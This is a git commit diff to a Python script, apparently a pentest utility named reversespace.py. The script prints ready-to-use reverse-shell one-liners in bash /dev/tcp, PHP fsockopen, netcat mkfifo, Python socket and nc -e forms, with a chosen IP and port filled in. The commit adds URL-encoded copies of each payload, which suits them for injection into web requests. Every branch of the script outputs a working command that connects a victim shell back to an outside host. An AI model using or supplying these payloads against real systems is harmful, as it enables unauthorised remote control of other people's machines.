6275a643b1b0189ca98692deae823e3beae0eacf
issk <76851155+ISSKsec@users.noreply.github.com>
2022-04-02 16:18:49 +0200

    Update reversespace.py

--- reversespace.py
+++ reversespace.py
@@ -5,7 +5,7 @@
 #pip3 install pwnlib ;pip3 install pwntools →→ It's not necesary
 import argparse
 import signal
-import sys
+import sys, urllib.parse
 import time
 from colorama import init, Fore, Back, Style
 from pwn import *
@@ -41,7 +41,7 @@ def choose():
 	log.info("[1]Bash\n[2]PHP\n[3]NC (recommended)\n[4]Python\n[5]NC (basic)")
 # Check reverse shells available
 	bash = "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
-	php = """php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");"""
+	php = """php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'"""
 	nc = 	'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'
 	python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 	nc2 = 'nc -e /bin/bash 10.0.0.1 443'
@@ -53,23 +53,28 @@ def reverse():
 	if add == 1:
 		log.info("Selected → bash")
 		time.sleep(1)
-		print("\033[1;31m"+"bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1" % (arg1,  arg2))
+		print("\033[1;31m"+"bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (arg1,  arg2))
+		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (arg1,  arg2)))
 	elif add == 2:
 		log.progress("Selected → php")
 		time.sleep(1)
 		print("\033[1;31m"+"""php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");""" % (arg1,  arg2))
+		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("""php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");""" % (arg1,  arg2)))
 	elif add == 3:
 		log.info("Select → nc (Recommended)")
 		time.sleep(1)
 		print("\033[1;31m"+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (arg1,  arg2))
+		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (arg1,  arg2)))
 	elif add == 4:
 		log.info("Select → python")
 		time.sleep(1)
-		print("\033[1;31m"+"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (arg1,  arg2))
+		python = print("\033[1;31m"+"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (arg1,  arg2))
+		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (arg1,  arg2)))
 	elif add == 5:
 		log.info("Selected → nc (Basic)")
 		time.sleep(1)
 		print("\033[1;31m"+"nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')
+		print("Url encode → "+"\033[1;31m"+urllib.parse.quote(("nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')))
 	else:
 		print("invalid selection...")
 		print("Bye bye")
